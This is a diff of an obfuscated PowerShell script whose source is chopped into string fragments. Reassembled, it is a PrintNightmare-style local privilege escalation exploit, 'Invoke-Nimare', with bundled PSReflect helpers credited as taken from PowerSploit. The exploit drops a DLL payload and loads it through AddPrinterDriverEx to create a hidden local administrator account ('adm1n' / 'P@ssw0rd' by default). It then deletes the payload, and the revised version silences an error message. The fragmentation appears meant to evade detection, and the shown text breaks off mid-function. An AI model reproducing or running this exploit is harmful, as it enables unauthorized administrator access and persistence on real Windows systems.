@@ -1,748 +1,748 @@
-$fragments = @('function Invo','ke-nimare
+$fragments = @('function In','voke-nimare','
 {
- ','   
-    param',' (
-        [s','tring]$Driver','Name = "Total','ly Not Malici','ous",
-       ',' [string]$New','User = "",
-  ','      [string',']$NewPassword',' = "",
-      ','  [string]$DL','L = ""
+    
+   ',' param (
+  ','      [stri','ng]$DriverN','ame = "Tota','lly Not Mal','icious",
+  ','      [stri','ng]$NewUser',' = "",
+    ','    [string',']$NewPasswo','rd = "",
+  ','      [stri','ng]$DLL = "','"
     )
-','
-    if ( $DL','L -eq "" ){
- ','       $nimar','e_data = [byt','e[]](get_nima','re_dll)
-     ','   $encoder =',' New-Object S','ystem.Text.Un','icodeEncoding','
 
-        if ','( $NewUser -n','e "" ) {
-    ','        $NewU','serBytes = $e','ncoder.GetByt','es($NewUser)
-','            [','System.Buffer',']::BlockCopy(','$NewUserBytes',', 0, $nimare_','data, 0x32e20',', $NewUserByt','es.Length)
-  ','          $ni','mare_data[0x3','2e20+$NewUser','Bytes.Length]',' = 0
-        ','    $nimare_d','ata[0x32e20+$','NewUserBytes.','Length+1] = 0','
-        } el','se {
-        ','    Write-Hos','t "[+] using ','default new u','ser: adm1n"
+  ','  if ( $DLL',' -eq "" ){
+','        $ni','mare_data =',' [byte[]](g','et_nimare_d','ll)
+       ',' $encoder =',' New-Object',' System.Tex','t.UnicodeEn','coding
+
+   ','     if ( $','NewUser -ne',' "" ) {
+   ','         $N','ewUserBytes',' = $encoder','.GetBytes($','NewUser)
+  ','          [','System.Buff','er]::BlockC','opy($NewUse','rBytes, 0, ','$nimare_dat','a, 0x32e20,',' $NewUserBy','tes.Length)','
+          ','  $nimare_d','ata[0x32e20','+$NewUserBy','tes.Length]',' = 0
+      ','      $nima','re_data[0x3','2e20+$NewUs','erBytes.Len','gth+1] = 0
+','        } e','lse {
+     ','       Writ','e-Host "[+]',' using defa','ult new use','r: adm1n"
  ','       }
 
-   ','     if ( $Ne','wPassword -ne',' "" ) {
-     ','       $NewPa','sswordBytes =',' $encoder.Get','Bytes($NewPas','sword)
-      ','      [System','.Buffer]::Blo','ckCopy($NewPa','sswordBytes, ','0, $nimare_da','ta, 0x32c20, ','$NewPasswordB','ytes.Length)
-','            $','nimare_data[0','x32c20+$NewPa','sswordBytes.L','ength] = 0
-  ','          $ni','mare_data[0x3','2c20+$NewPass','wordBytes.Len','gth+1] = 0
-  ','      } else ','{
-           ',' Write-Host "','[+] using def','ault new pass','word: P@ssw0r','d"
-        }
-','
-        $DLL',' = [System.IO','.Path]::GetTe','mpPath() + "n','imare.dll"
-  ','      [System','.IO.File]::Wr','iteAllBytes($','DLL, $nimare_','data)
-       ',' Write-Host "','[+] created p','ayload at $DL','L"
-        $d','elete_me = $t','rue
-    } els','e {
-        W','rite-Host "[+','] using user-','supplied payl','oad at $DLL"
-','        Write','-Host "[!] ig','noring NewUse','r and NewPass','word argument','s"
-        $d','elete_me = $f','alse
-    }
+ ','       if (',' $NewPasswo','rd -ne "" )',' {
+        ','    $NewPas','swordBytes ','= $encoder.','GetBytes($N','ewPassword)','
+          ','  [System.B','uffer]::Blo','ckCopy($New','PasswordByt','es, 0, $nim','are_data, 0','x32c20, $Ne','wPasswordBy','tes.Length)','
+          ','  $nimare_d','ata[0x32c20','+$NewPasswo','rdBytes.Len','gth] = 0
+  ','          $','nimare_data','[0x32c20+$N','ewPasswordB','ytes.Length','+1] = 0
+   ','     } else',' {
+        ','    Write-H','ost "[+] us','ing default',' new passwo','rd: P@ssw0r','d"
+        ','}
 
- ','   $Mod = New','-InMemoryModu','le -ModuleNam','e "A$(Get-Ran','dom)"
-
-    $F','unctionDefini','tions = @(
-  ','    (func win','spool.drv Add','PrinterDriver','Ex ([bool]) @','([string], [U','int32], [IntP','tr], [Uint32]',') -Charset Au','to -SetLastEr','ror),
-      (','func winspool','.drv EnumPrin','terDrivers([b','ool]) @( [str','ing], [string','], [Uint32], ','[IntPtr], [UI','nt32], [Uint3','2].MakeByRefT','ype(), [Uint3','2].MakeByRefT','ype()) -Chars','et Auto -SetL','astError)
-   ',' )
-
-    $Type','s = $Function','Definitions |',' Add-Win32Typ','e -Module $Mo','d -Namespace ','''Mod''
-
-    # ','Define custom',' structures f','or types crea','ted
-    $DRIV','ER_INFO_2 = s','truct $Mod DR','IVER_INFO_2 @','{
-        cVe','rsion = field',' 0 Uint64;
-  ','      pName =',' field 1 stri','ng -MarshalAs',' @("LPTStr");','
-        pEnv','ironment = fi','eld 2 string ','-MarshalAs @(','"LPTStr");
-  ','      pDriver','Path = field ','3 string -Mar','shalAs @("LPT','Str");
-      ','  pDataFile =',' field 4 stri','ng -MarshalAs',' @("LPTStr");','
-        pCon','figFile = fie','ld 5 string -','MarshalAs @("','LPTStr");
+        ','$DLL = [Sys','tem.IO.Path',']::GetTempP','ath() + "ni','mare.dll"
+ ','       [Sys','tem.IO.File',']::WriteAll','Bytes($DLL,',' $nimare_da','ta)
+       ',' Write-Host',' "[+] creat','ed payload ','at $DLL"
+  ','      $dele','te_me = $tr','ue
+    } el','se {
+      ','  Write-Hos','t "[+] usin','g user-supp','lied payloa','d at $DLL"
+','        Wri','te-Host "[!','] ignoring ','NewUser and',' NewPasswor','d arguments','"
+        $','delete_me =',' $false
    ',' }
 
-    $wins','pool = $Types','[''winspool.dr','v'']
-    $APD_','COPY_ALL_FILE','S = 0x0000000','4
+    $Mo','d = New-InM','emoryModule',' -ModuleNam','e "A$(Get-R','andom)"
 
-    [Uint3','2]($cbNeeded)',' = 0
-    [Uin','t32]($cReturn','ed) = 0
-
-    ','if ( $winspoo','l::EnumPrinte','rDrivers($nul','l, "Windows x','64", 2, [IntP','tr]::Zero, 0,',' [ref]$cbNeed','ed, [ref]$cRe','turned) ){
-  ','      Write-H','ost "[!] Enum','PrinterDriver','s should fail','!"
-        re','turn
-    }
-
- ','   [IntPtr]$p','Addr = [Syste','m.Runtime.Int','eropServices.','Marshal]::All','ocHGlobal([Ui','nt32]($cbNeed','ed))
-
-    if ','( $winspool::','EnumPrinterDr','ivers($null, ','"Windows x64"',', 2, $pAddr, ','$cbNeeded, [r','ef]$cbNeeded,',' [ref]$cRetur','ned) ){
-     ','   $driver = ','[System.Runti','me.InteropSer','vices.Marshal',']::PtrToStruc','ture($pAddr, ','[System.Type]','$DRIVER_INFO_','2)
-    } else',' {
-        Wr','ite-Host "[!]',' failed to ge','t current dri','ver list"
-   ','     [System.','Runtime.Inter','opServices.Ma','rshal]::FreeH','Global($pAddr',')
-        ret','urn
-    }
-
-  ','  Write-Host ','"[+] using pD','riverPath = `','"$($driver.pD','riverPath)`""','
-    [System.','Runtime.Inter','opServices.Ma','rshal]::FreeH','Global($pAddr',')
-
-    $drive','r_info = New-','Object $DRIVE','R_INFO_2
-    ','$driver_info.','cVersion = 3
-','    $driver_i','nfo.pConfigFi','le = $DLL
-   ',' $driver_info','.pDataFile = ','$DLL
-    $dri','ver_info.pDri','verPath = $dr','iver.pDriverP','ath
-    $driv','er_info.pEnvi','ronment = "Wi','ndows x64"
-  ','  $driver_inf','o.pName = $Dr','iverName
-
-   ',' $pDriverInfo',' = [System.Ru','ntime.Interop','Services.Mars','hal]::AllocHG','lobal([System','.Runtime.Inte','ropServices.M','arshal]::Size','Of($driver_in','fo))
-    [Sys','tem.Runtime.I','nteropService','s.Marshal]::S','tructureToPtr','($driver_info',', $pDriverInf','o, $false)
-
- ','   if ( $wins','pool::AddPrin','terDriverEx($','null, 2, $pDr','iverInfo, $AP','D_COPY_ALL_FI','LES -bor 0x10',' -bor 0x8000)',' ) {
-        ','if ( $delete_','me ) {
-      ','      Write-H','ost "[+] adde','d user $NewUs','er as local a','dministrator"','
-        } el','se {
-        ','    Write-Hos','t "[+] driver',' appears to h','ave been load','ed!"
-        ','}
-    } else ','{
-        Wri','te-Error "[!]',' AddPrinterDr','iverEx failed','"
-    }
-
-    ','if ( $delete_','me ) {
-      ','  Write-Host ','"[+] deleting',' payload from',' $DLL"
-      ','  Remove-Item',' -Force $DLL
-','    }
-}
-
-
-###','#############','#############','#############','#############','#
-# Stolen fr','om PowerSploi','t: https://gi','thub.com/Powe','rShellMafia/P','owerSploit
-##','#############','#############','#############','#############','##
-
-#########','#############','#############','#############','########
-#
-# ','PSReflect cod','e for Windows',' API access
-#',' Author: @mat','tifestation
-#','   https://ra','w.githubuserc','ontent.com/ma','ttifestation/','PSReflect/mas','ter/PSReflect','.psm1
-#
-#####','#############','#############','#############','############
-','
-function New','-InMemoryModu','le {
-<#
-.SYNO','PSIS
-Creates ','an in-memory ','assembly and ','module
-Author',': Matthew Gra','eber (@mattif','estation)
-Lic','ense: BSD 3-C','lause
-Require','d Dependencie','s: None
-Optio','nal Dependenc','ies: None
-.DE','SCRIPTION
-Whe','n defining cu','stom enums, s','tructs, and u','nmanaged func','tions, it is
-','necessary to ','associate to ','an assembly m','odule. This h','elper functio','n
-creates an ','in-memory mod','ule that can ','be passed to ','the ''enum'',
-''','struct'', and ','Add-Win32Type',' functions.
-.','PARAMETER Mod','uleName
-Speci','fies the desi','red name for ','the in-memory',' assembly and',' module. If
-M','oduleName is ','not provided,',' it will defa','ult to a GUID','.
-.EXAMPLE
-$M','odule = New-I','nMemoryModule',' -ModuleName ','Win32
-#>
-
-   ',' [Diagnostics','.CodeAnalysis','.SuppressMess','ageAttribute(','''PSUseShouldP','rocessForStat','eChangingFunc','tions'', '''')]
-','    [CmdletBi','nding()]
-    ','Param (
-     ','   [Parameter','(Position = 0',')]
-        [V','alidateNotNul','lOrEmpty()]
- ','       [Strin','g]
-        $M','oduleName = [','Guid]::NewGui','d().ToString(',')
-    )
-
-    ','$AppDomain = ','[Reflection.A','ssembly].Asse','mbly.GetType(','''System.AppDo','main'').GetPro','perty(''Curren','tDomain'').Get','Value($null, ','@())
-    $Loa','dedAssemblies',' = $AppDomain','.GetAssemblie','s()
-
-    fore','ach ($Assembl','y in $LoadedA','ssemblies) {
-','        if ($','Assembly.Full','Name -and ($A','ssembly.FullN','ame.Split('',''',')[0] -eq $Mod','uleName)) {
- ','           re','turn $Assembl','y
-        }
- ','   }
-
-    $Dy','nAssembly = N','ew-Object Ref','lection.Assem','blyName($Modu','leName)
-    $','Domain = $App','Domain
-    $A','ssemblyBuilde','r = $Domain.D','efineDynamicA','ssembly($DynA','ssembly, ''Run',''')
-    $Modul','eBuilder = $A','ssemblyBuilde','r.DefineDynam','icModule($Mod','uleName, $Fal','se)
-
-    retu','rn $ModuleBui','lder
-}
-
-# A h','elper functio','n used to red','uce typing wh','ile defining ','function
-# pr','ototypes for ','Add-Win32Type','.
-function fu','nc {
-    Para','m (
-        [','Parameter(Pos','ition = 0, Ma','ndatory = $Tr','ue)]
-        ','[String]
-    ','    $DllName,','
-
-        [Pa','rameter(Posit','ion = 1, Mand','atory = $True',')]
-        [s','tring]
-      ','  $FunctionNa','me,
-
-        ','[Parameter(Po','sition = 2, M','andatory = $T','rue)]
-       ',' [Type]
-     ','   $ReturnTyp','e,
-
-        [','Parameter(Pos','ition = 3)]
- ','       [Type[',']]
-        $P','arameterTypes',',
-
-        [P','arameter(Posi','tion = 4)]
-  ','      [Runtim','e.InteropServ','ices.CallingC','onvention]
-  ','      $Native','CallingConven','tion,
-
-      ','  [Parameter(','Position = 5)',']
-        [Ru','ntime.Interop','Services.Char','Set]
-        ','$Charset,
-
-  ','      [String',']
-        $En','tryPoint,
-
-  ','      [Switch',']
-        $Se','tLastError
+  ','  $Function','Definitions',' = @(
+     ',' (func wins','pool.drv Ad','dPrinterDri','verEx ([boo','l]) @([stri','ng], [Uint3','2], [IntPtr','], [Uint32]',') -Charset ','Auto -SetLa','stError),
+ ','     (func ','winspool.dr','v EnumPrint','erDrivers([','bool]) @( [','string], [s','tring], [Ui','nt32], [Int','Ptr], [UInt','32], [Uint3','2].MakeByRe','fType(), [U','int32].Make','ByRefType()',') -Charset ','Auto -SetLa','stError)
   ','  )
 
-    $Pro','perties = @{
-','        DllNa','me = $DllName','
-        Func','tionName = $F','unctionName
- ','       Return','Type = $Retur','nType
+    $T','ypes = $Fun','ctionDefini','tions | Add','-Win32Type ','-Module $Mo','d -Namespac','e ''Mod''
+
+  ','  # Define ','custom stru','ctures for ','types creat','ed
+    $DRI','VER_INFO_2 ','= struct $M','od DRIVER_I','NFO_2 @{
+  ','      cVers','ion = field',' 0 Uint64;
+','        pNa','me = field ','1 string -M','arshalAs @(','"LPTStr");
+','        pEn','vironment =',' field 2 st','ring -Marsh','alAs @("LPT','Str");
+    ','    pDriver','Path = fiel','d 3 string ','-MarshalAs ','@("LPTStr")',';
+        p','DataFile = ','field 4 str','ing -Marsha','lAs @("LPTS','tr");
+     ','   pConfigF','ile = field',' 5 string -','MarshalAs @','("LPTStr");','
     }
 
-','    if ($Para','meterTypes) {',' $Properties[','''ParameterTyp','es''] = $Param','eterTypes }
- ','   if ($Nativ','eCallingConve','ntion) { $Pro','perties[''Nati','veCallingConv','ention''] = $N','ativeCallingC','onvention }
- ','   if ($Chars','et) { $Proper','ties[''Charset','''] = $Charset',' }
-    if ($S','etLastError) ','{ $Properties','[''SetLastErro','r''] = $SetLas','tError }
-    ','if ($EntryPoi','nt) { $Proper','ties[''EntryPo','int''] = $Entr','yPoint }
+   ',' $winspool ','= $Types[''w','inspool.drv',''']
+    $APD','_COPY_ALL_F','ILES = 0x00','000004
 
-   ',' New-Object P','SObject -Prop','erty $Propert','ies
-}
+   ',' [Uint32]($','cbNeeded) =',' 0
+    [Uin','t32]($cRetu','rned) = 0
 
-functi','on Add-Win32T','ype
-{
-<#
-.SYN','OPSIS
-Creates',' a .NET type ','for an unmana','ged Win32 fun','ction.
-Author',': Matthew Gra','eber (@mattif','estation)
-Lic','ense: BSD 3-C','lause
-Require','d Dependencie','s: None
-Optio','nal Dependenc','ies: func
-.DE','SCRIPTION
-Add','-Win32Type en','ables you to ','easily intera','ct with unman','aged (i.e.
-Wi','n32 unmanaged',') functions i','n PowerShell.',' After provid','ing
-Add-Win32','Type with a f','unction signa','ture, a .NET ','type is creat','ed
-using refl','ection (i.e. ','csc.exe is ne','ver called li','ke with Add-T','ype).
-The ''fu','nc'' helper fu','nction can be',' used to redu','ce typing whe','n defining
-mu','ltiple functi','on definition','s.
-.PARAMETER',' DllName
-The ','name of the D','LL.
-.PARAMETE','R FunctionNam','e
-The name of',' the target f','unction.
-.PAR','AMETER EntryP','oint
-The DLL ','export functi','on name. This',' argument sho','uld be specif','ied if the
-sp','ecified funct','ion name is d','ifferent than',' the name of ','the exported
-','function.
-.PA','RAMETER Retur','nType
-The ret','urn type of t','he function.
-','.PARAMETER Pa','rameterTypes
-','The function ','parameters.
-.','PARAMETER Nat','iveCallingCon','vention
-Speci','fies the nati','ve calling co','nvention of t','he function. ','Defaults to
-s','tdcall.
-.PARA','METER Charset','
-If you need ','to explicitly',' call an ''A'' ','or ''W'' Win32 ','function, you',' can
-specify ','the character',' set.
-.PARAME','TER SetLastEr','ror
-Indicates',' whether the ','callee calls ','the SetLastEr','ror Win32 API','
-function bef','ore returning',' from the att','ributed metho','d.
-.PARAMETER',' Module
-The i','n-memory modu','le that will ','host the func','tions. Use
-Ne','w-InMemoryMod','ule to define',' an in-memory',' module.
-.PAR','AMETER Namesp','ace
-An option','al namespace ','to prepend to',' the type. Ad','d-Win32Type d','efaults
-to a ','namespace con','sisting only ','of the name o','f the DLL.
-.E','XAMPLE
-$Mod =',' New-InMemory','Module -Modul','eName Win32
-$','FunctionDefin','itions = @(
- ',' (func kernel','32 GetProcAdd','ress ([IntPtr',']) @([IntPtr]',', [String]) -','Charset Ansi ','-SetLastError','),
-  (func ke','rnel32 GetMod','uleHandle ([I','ntptr]) @([St','ring]) -SetLa','stError),
-  (','func ntdll Rt','lGetCurrentPe','b ([IntPtr]) ','@())
-)
-$Types',' = $FunctionD','efinitions | ','Add-Win32Type',' -Module $Mod',' -Namespace ''','Win32''
-$Kerne','l32 = $Types[','''kernel32'']
-$','Ntdll = $Type','s[''ntdll'']
-$N','tdll::RtlGetC','urrentPeb()
-$','ntdllbase = $','Kernel32::Get','ModuleHandle(','''ntdll'')
-$Ker','nel32::GetPro','cAddress($ntd','llbase, ''RtlG','etCurrentPeb''',')
-.NOTES
-Insp','ired by Lee H','olmes'' Invoke','-WindowsApi h','ttp://poshcod','e.org/2189
-Wh','en defining m','ultiple funct','ion prototype','s, it is idea','l to provide
-','Add-Win32Type',' with an arra','y of function',' signatures. ','That way, the','y
-are all inc','orporated int','o the same in','-memory modul','e.
-#>
+','    if ( $w','inspool::En','umPrinterDr','ivers($null',', "Windows ','x64", 2, [I','ntPtr]::Zer','o, 0, [ref]','$cbNeeded, ','[ref]$cRetu','rned) ){
+  ','      Write','-Host "[!] ','EnumPrinter','Drivers sho','uld fail!"
+','        ret','urn
+    }
 
-    [O','utputType([Ha','shtable])]
-  ','  Param(
-    ','    [Paramete','r(Mandatory=$','True, ValueFr','omPipelineByP','ropertyName=$','True)]
-      ','  [String]
-  ','      $DllNam','e,
+','    [IntPtr',']$pAddr = [','System.Runt','ime.Interop','Services.Ma','rshal]::All','ocHGlobal([','Uint32]($cb','Needed))
 
-        [','Parameter(Man','datory=$True,',' ValueFromPip','elineByProper','tyName=$True)',']
-        [St','ring]
-       ',' $FunctionNam','e,
+ ','   if ( $wi','nspool::Enu','mPrinterDri','vers($null,',' "Windows x','64", 2, $pA','ddr, $cbNee','ded, [ref]$','cbNeeded, [','ref]$cRetur','ned) ){
+   ','     $drive','r = [System','.Runtime.In','teropServic','es.Marshal]','::PtrToStru','cture($pAdd','r, [System.','Type]$DRIVE','R_INFO_2)
+ ','   } else {','
+        Wr','ite-Host "[','!] failed t','o get curre','nt driver l','ist"
+      ','  [System.R','untime.Inte','ropServices','.Marshal]::','FreeHGlobal','($pAddr)
+  ','      retur','n
+    }
 
-        [','Parameter(Val','ueFromPipelin','eByPropertyNa','me=$True)]
-  ','      [String',']
-        $En','tryPoint,
-
-  ','      [Parame','ter(Mandatory','=$True, Value','FromPipelineB','yPropertyName','=$True)]
-    ','    [Type]
-  ','      $Return','Type,
-
-      ','  [Parameter(','ValueFromPipe','lineByPropert','yName=$True)]','
-        [Typ','e[]]
-        ','$ParameterTyp','es,
-
-        ','[Parameter(Va','lueFromPipeli','neByPropertyN','ame=$True)]
- ','       [Runti','me.InteropSer','vices.Calling','Convention]
- ','       $Nativ','eCallingConve','ntion = [Runt','ime.InteropSe','rvices.Callin','gConvention]:',':StdCall,
-
-  ','      [Parame','ter(ValueFrom','PipelineByPro','pertyName=$Tr','ue)]
-        ','[Runtime.Inte','ropServices.C','harSet]
-     ','   $Charset =',' [Runtime.Int','eropServices.','CharSet]::Aut','o,
-
-        [','Parameter(Val','ueFromPipelin','eByPropertyNa','me=$True)]
-  ','      [Switch',']
-        $Se','tLastError,
-
-','        [Para','meter(Mandato','ry=$True)]
-  ','      [Valida','teScript({($_',' -is [Reflect','ion.Emit.Modu','leBuilder]) -','or ($_ -is [R','eflection.Ass','embly])})]
-  ','      $Module',',
-
-        [V','alidateNotNul','l()]
-        ','[String]
-    ','    $Namespac','e = ''''
-    )
+  ','  Write-Hos','t "[+] usin','g pDriverPa','th = `"$($d','river.pDriv','erPath)`""
+','    [System','.Runtime.In','teropServic','es.Marshal]','::FreeHGlob','al($pAddr)
 ','
-    BEGIN
-  ','  {
-        $','TypeHash = @{','}
+    $drive','r_info = Ne','w-Object $D','RIVER_INFO_','2
+    $driv','er_info.cVe','rsion = 3
+ ','   $driver_','info.pConfi','gFile = $DL','L
+    $driv','er_info.pDa','taFile = $D','LL
+    $dri','ver_info.pD','riverPath =',' $driver.pD','riverPath
+ ','   $driver_','info.pEnvir','onment = "W','indows x64"','
+    $drive','r_info.pNam','e = $Driver','Name
+
+    $','pDriverInfo',' = [System.','Runtime.Int','eropService','s.Marshal]:',':AllocHGlob','al([System.','Runtime.Int','eropService','s.Marshal]:',':SizeOf($dr','iver_info))','
+    [Syste','m.Runtime.I','nteropServi','ces.Marshal',']::Structur','eToPtr($dri','ver_info, $','pDriverInfo',', $false)
+
+','    if ( $w','inspool::Ad','dPrinterDri','verEx($null',', 2, $pDriv','erInfo, $AP','D_COPY_ALL_','FILES -bor ','0x10 -bor 0','x8000) ) {
+','        if ','( $delete_m','e ) {
+     ','       Writ','e-Host "[+]',' added user',' $NewUser a','s local adm','inistrator"','
+        } ','else {
+    ','        Wri','te-Host "[+','] driver ap','pears to ha','ve been loa','ded!"
+     ','   }
+    } ','else {
+    ','    #Write-','Error "[!] ','AddPrinterD','riverEx fai','led"
     }
-
-    ','PROCESS
-    {','
-        if (','$Module -is [','Reflection.As','sembly])
-    ','    {
-       ','     if ($Nam','espace)
-     ','       {
-    ','            $','TypeHash[$Dll','Name] = $Modu','le.GetType("$','Namespace.$Dl','lName")
-     ','       }
-    ','        else
-','            {','
-            ','    $TypeHash','[$DllName] = ','$Module.GetTy','pe($DllName)
-','            }','
-        }
-  ','      else
-  ','      {
-     ','       # Defi','ne one type f','or each DLL
- ','           if',' (!$TypeHash.','ContainsKey($','DllName))
-   ','         {
-  ','             ',' if ($Namespa','ce)
-         ','       {
-    ','             ','   $TypeHash[','$DllName] = $','Module.Define','Type("$Namesp','ace.$DllName"',', ''Public,Bef','oreFieldInit''',')
-           ','     }
-      ','          els','e
-           ','     {
-      ','             ',' $TypeHash[$D','llName] = $Mo','dule.DefineTy','pe($DllName, ','''Public,Befor','eFieldInit'')
-','             ','   }
-        ','    }
-
-      ','      $Method',' = $TypeHash[','$DllName].Def','ineMethod(
-  ','             ',' $FunctionNam','e,
-          ','      ''Public',',Static,Pinvo','keImpl'',
-    ','            $','ReturnType,
- ','             ','  $ParameterT','ypes)
-
-      ','      # Make ','each ByRef pa','rameter an Ou','t parameter
- ','           $i',' = 1
-        ','    foreach($','Parameter in ','$ParameterTyp','es)
-         ','   {
-        ','        if ($','Parameter.IsB','yRef)
-       ','         {
-  ','             ','     [void] $','Method.Define','Parameter($i,',' ''Out'', $null',')
-           ','     }
-
-     ','           $i','++
-          ','  }
-
-        ','    $DllImpor','t = [Runtime.','InteropServic','es.DllImportA','ttribute]
-   ','         $Set','LastErrorFiel','d = $DllImpor','t.GetField(''S','etLastError'')','
-            ','$CallingConve','ntionField = ','$DllImport.Ge','tField(''Calli','ngConvention''',')
-           ',' $CharsetFiel','d = $DllImpor','t.GetField(''C','harSet'')
-    ','        $Entr','yPointField =',' $DllImport.G','etField(''Entr','yPoint'')
-    ','        if ($','SetLastError)',' { $SLEValue ','= $True } els','e { $SLEValue',' = $False }
-
-','            i','f ($PSBoundPa','rameters[''Ent','ryPoint'']) { ','$ExportedFunc','Name = $Entry','Point } else ','{ $ExportedFu','ncName = $Fun','ctionName }
-
-','            #',' Equivalent t','o C# version ','of [DllImport','(DllName)]
-  ','          $Co','nstructor = [','Runtime.Inter','opServices.Dl','lImportAttrib','ute].GetConst','ructor([Strin','g])
-         ','   $DllImport','Attribute = N','ew-Object Ref','lection.Emit.','CustomAttribu','teBuilder($Co','nstructor,
-  ','             ',' $DllName, [R','eflection.Pro','pertyInfo[]] ','@(), [Object[',']] @(),
-     ','           [R','eflection.Fie','ldInfo[]] @($','SetLastErrorF','ield,
-       ','             ','             ','          $Ca','llingConventi','onField,
-    ','             ','             ','             ','$CharsetField',',
-           ','             ','             ','      $EntryP','ointField),
- ','             ','  [Object[]] ','@($SLEValue,
-','             ','             ','   ([Runtime.','InteropServic','es.CallingCon','vention] $Nat','iveCallingCon','vention),
-   ','             ','             ','([Runtime.Int','eropServices.','CharSet] $Cha','rset),
-      ','             ','          $Ex','portedFuncNam','e))
-
-        ','    $Method.S','etCustomAttri','bute($DllImpo','rtAttribute)
-','        }
-   ',' }
-
-    END
- ','   {
-        ','if ($Module -','is [Reflectio','n.Assembly])
-','        {
-   ','         retu','rn $TypeHash
-','        }
-
-  ','      $Return','Types = @{}
-
-','        forea','ch ($Key in $','TypeHash.Keys',')
-        {
- ','           $T','ype = $TypeHa','sh[$Key].Crea','teType()
-
-   ','         $Ret','urnTypes[$Key','] = $Type
-   ','     }
-
-     ','   return $Re','turnTypes
-   ',' }
-}
-
-
-functi','on psenum {
-<','#
-.SYNOPSIS
-C','reates an in-','memory enumer','ation for use',' in your Powe','rShell sessio','n.
-Author: Ma','tthew Graeber',' (@mattifesta','tion)
-License',': BSD 3-Claus','e
-Required De','pendencies: N','one
-Optional ','Dependencies:',' None
-.DESCRI','PTION
-The ''ps','enum'' functio','n facilitates',' the creation',' of enums ent','irely in
-memo','ry using as c','lose to a "C ','style" as Pow','erShell will ','allow.
-.PARAM','ETER Module
-T','he in-memory ','module that w','ill host the ','enum. Use
-New','-InMemoryModu','le to define ','an in-memory ','module.
-.PARA','METER FullNam','e
-The fully-q','ualified name',' of the enum.','
-.PARAMETER T','ype
-The type ','of each enum ','element.
-.PAR','AMETER EnumEl','ements
-A hash','table of enum',' elements.
-.P','ARAMETER Bitf','ield
-Specifie','s that the en','um should be ','treated as a ','bitfield.
-.EX','AMPLE
-$Mod = ','New-InMemoryM','odule -Module','Name Win32
-$I','mageSubsystem',' = psenum $Mo','d PE.IMAGE_SU','BSYSTEM UInt1','6 @{
-    UNKN','OWN =        ','          0
- ','   NATIVE =  ','             ','    1 # Image',' doesn''t requ','ire a subsyst','em.
-    WINDO','WS_GUI =     ','         2 # ','Image runs in',' the Windows ','GUI subsystem','.
-    WINDOWS','_CUI =       ','       3 # Im','age runs in t','he Windows ch','aracter subsy','stem.
-    OS2','_CUI =       ','           5 ','# Image runs ','in the OS/2 c','haracter subs','ystem.
-    PO','SIX_CUI =    ','            7',' # Image runs',' in the Posix',' character su','bsystem.
-    ','NATIVE_WINDOW','S =          ',' 8 # Image is',' a native Win','9x driver.
-  ','  WINDOWS_CE_','GUI =        ','   9 # Image ','runs in the W','indows CE sub','system.
-    E','FI_APPLICATIO','N =          ','10
-    EFI_BO','OT_SERVICE_DR','IVER =  11
-  ','  EFI_RUNTIME','_DRIVER =    ','   12
-    EFI','_ROM =       ','           13','
-    XBOX =  ','             ','      14
-    ','WINDOWS_BOOT_','APPLICATION =',' 16
-}
-.NOTES
-','PowerShell pu','rists may dis','agree with th','e naming of t','his function ','but
-again, th','is was develo','ped in such a',' way so as to',' emulate a "C',' style"
-defin','ition as clos','ely as possib','le. Sorry, I''','m not going t','o name it
-New','-Enum. :P
-#>
 ','
-    [OutputT','ype([Type])]
-','    Param (
- ','       [Param','eter(Position',' = 0, Mandato','ry=$True)]
-  ','      [Valida','teScript({($_',' -is [Reflect','ion.Emit.Modu','leBuilder]) -','or ($_ -is [R','eflection.Ass','embly])})]
-  ','      $Module',',
-
-        [P','arameter(Posi','tion = 1, Man','datory=$True)',']
-        [Va','lidateNotNull','OrEmpty()]
-  ','      [String',']
-        $Fu','llName,
-
-    ','    [Paramete','r(Position = ','2, Mandatory=','$True)]
-     ','   [Type]
-   ','     $Type,
-
-','        [Para','meter(Positio','n = 3, Mandat','ory=$True)]
- ','       [Valid','ateNotNullOrE','mpty()]
-     ','   [Hashtable',']
-        $En','umElements,
-
-','        [Swit','ch]
-        $','Bitfield
-    ',')
-
-    if ($M','odule -is [Re','flection.Asse','mbly])
-    {
-','        retur','n ($Module.Ge','tType($FullNa','me))
-    }
-
- ','   $EnumType ','= $Type -as [','Type]
-
-    $E','numBuilder = ','$Module.Defin','eEnum($FullNa','me, ''Public'',',' $EnumType)
-
-','    if ($Bitf','ield)
-    {
- ','       $Flags','Constructor =',' [FlagsAttrib','ute].GetConst','ructor(@())
- ','       $Flags','CustomAttribu','te = New-Obje','ct Reflection','.Emit.CustomA','ttributeBuild','er($FlagsCons','tructor, @())','
-        $Enu','mBuilder.SetC','ustomAttribut','e($FlagsCusto','mAttribute)
+    if ( $','delete_me )',' {
+        ','Write-Host ','"[+] deleti','ng payload ','from $DLL"
+','        Rem','ove-Item -F','orce $DLL
  ','   }
-
-    for','each ($Key in',' $EnumElement','s.Keys)
-    {','
-        # Ap','ply the speci','fied enum typ','e to each ele','ment
-        ','$null = $Enum','Builder.Defin','eLiteral($Key',', $EnumElemen','ts[$Key] -as ','$EnumType)
-  ','  }
-
-    $Enu','mBuilder.Crea','teType()
 }
 
 
-','# A helper fu','nction used t','o reduce typi','ng while defi','ning struct
-#',' fields.
-func','tion field {
-','    Param (
- ','       [Param','eter(Position',' = 0, Mandato','ry=$True)]
-  ','      [UInt16',']
-        $Po','sition,
+##','###########','###########','###########','###########','##########
+','# Stolen fr','om PowerSpl','oit: https:','//github.co','m/PowerShel','lMafia/Powe','rSploit
+###','###########','###########','###########','###########','#########
 
-    ','    [Paramete','r(Position = ','1, Mandatory=','$True)]
-     ','   [Type]
-   ','     $Type,
+','###########','###########','###########','###########','###########','#
+#
+# PSRef','lect code f','or Windows ','API access
+','# Author: @','mattifestat','ion
+#   htt','ps://raw.gi','thubusercon','tent.com/ma','ttifestatio','n/PSReflect','/master/PSR','eflect.psm1','
+#
+########','###########','###########','###########','###########','####
 
-','        [Para','meter(Positio','n = 2)]
-     ','   [UInt16]
- ','       $Offse','t,
-
-        [','Object[]]
-   ','     $Marshal','As
-    )
-
-   ',' @{
-        P','osition = $Po','sition
-      ','  Type = $Typ','e -as [Type]
-','        Offse','t = $Offset
- ','       Marsha','lAs = $Marsha','lAs
-    }
-}
-
-','
-function str','uct
-{
+funct','ion New-InM','emoryModule',' {
 <#
-.SYN','OPSIS
-Creates',' an in-memory',' struct for u','se in your Po','werShell sess','ion.
-Author: ','Matthew Graeb','er (@mattifes','tation)
-Licen','se: BSD 3-Cla','use
-Required ','Dependencies:',' None
-Optiona','l Dependencie','s: field
-.DES','CRIPTION
